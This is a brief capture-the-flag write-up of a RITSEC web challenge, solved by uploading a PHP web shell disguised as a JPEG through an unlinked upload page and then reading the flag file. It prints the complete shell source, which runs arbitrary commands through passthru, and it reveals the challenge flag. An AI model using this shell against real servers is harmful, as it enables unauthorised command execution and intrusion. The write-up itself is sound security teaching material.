#### Challenge:

http://ctfchallenges.ritsec.club:8003/

Flag format is `RS_CTF{}`

---

#### Solution:

Checking the provided site, we are presented with something that is supposed to be photo gallery in the future. In the source code of the site we found comment: `<!-- upload and photos not yet linked --` which hints that `http://ctfchallenges.ritsec.club:8003/upload.php` exists. We tried to upload the file found at [https://github.com/jgor/php-jpeg-shell/blob/master/shell.php](https://github.com/jgor/php-jpeg-shell/blob/master/shell.php) (see the code below) as `.jpeg` and got `reverse shell`. After some fooling around we do `cat /home/flag.txt` and Bob's your uncle.

```php
����
<form action="" method="get">
Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
</form>
Output:<br />
<pre><?php passthru($_REQUEST['cmd'], $result); ?></pre>
```

---

<details><summary>FLAG:</summary>

```
RS_CTF{FILE_UPLOAD_ISN'T_SECURE}
```

</details>
<br/>
